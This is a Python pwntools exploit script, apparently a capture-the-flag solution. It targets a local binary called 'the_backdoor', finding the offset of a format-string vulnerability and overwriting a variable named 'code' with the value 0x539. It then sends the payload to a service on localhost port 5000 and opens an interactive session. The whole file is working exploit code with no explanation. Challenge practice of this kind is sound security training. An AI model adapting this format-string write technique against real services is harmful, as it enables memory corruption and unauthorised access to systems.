from pwn import *

context(arch="amd64")

elf = ELF("./the_backdoor")
code_addr = elf.symbols["code"]
log.info(f"Code address discovered: {code_addr:#04x}")


def exec_format(payload):
    p = process("./the_backdoor")
    p.recvuntil(b'> ')
    p.sendline(payload)
    output = p.recvline()
    p.kill()
    return output


autofmt = FmtStr(exec_format)

offset = autofmt.offset
log.info(f"Offset discovered: {offset:#04x}")

writes = {code_addr: 0x539}

# r = process("./the_backdoor")
r = remote("localhost", 5000)
r.recvuntil(b"> ")
payload = fmtstr_payload(offset, writes)
print(payload.__repr__())
r.sendline(payload)
r.interactive()
